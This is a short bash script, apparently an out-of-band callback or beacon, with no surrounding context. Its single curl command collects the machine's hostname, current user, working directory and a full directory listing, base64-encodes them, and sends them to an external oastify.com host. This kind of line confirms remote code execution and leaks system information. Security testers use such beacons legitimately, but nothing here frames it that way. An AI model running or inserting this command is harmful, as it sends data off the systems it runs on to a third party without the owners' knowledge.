#!/bin/bash

curl -H "Hostname: $(hostname | base64)" -H "Whoami: $(whoami | base64)" -H "Pwd: $(pwd | base64)" -d $(ls -la | base64)  http://4w17i7alv80o18ihsu7zof2pigo9cz0o.oastify.com
